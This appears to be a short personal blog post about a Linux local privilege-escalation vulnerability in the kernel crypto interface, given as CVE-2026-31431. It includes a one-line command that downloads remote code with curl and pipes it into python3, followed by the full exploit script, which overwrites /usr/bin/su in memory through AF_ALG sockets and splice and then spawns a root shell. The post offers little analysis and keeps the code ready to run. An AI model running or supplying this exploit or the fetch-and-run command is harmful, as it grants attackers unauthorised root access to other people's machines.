---
title: "Copy.fail CVE"
description: "Second Post. copy.fail linux vulnerability in encryption module"
date: 2026-05-11
tags: ["Cybersecurity"]
---

## Thoughts
I thought this was an absolute *crazy* find. It allows anyone to become root by modifying something in memory, so it is nearly untraceable. You can read more at [copy.fail](copy.fail). Basically anything linux based that was updated between 2017 and 2026 is vulnerable to this.

I have not run this before, so idk how well it works. But in case it gets taken down, I'm copying a version here for myself to look at.

## Shortcut to run this exploit 
```
curl https://copy.fail/exp | python3 && su
```

## Source code
[source](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
```python
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):
 return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:
  u.recv(8+t)
 except:
  0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):
 c(f,i,e[i:i+4]);i+=4
g.system("su")
```
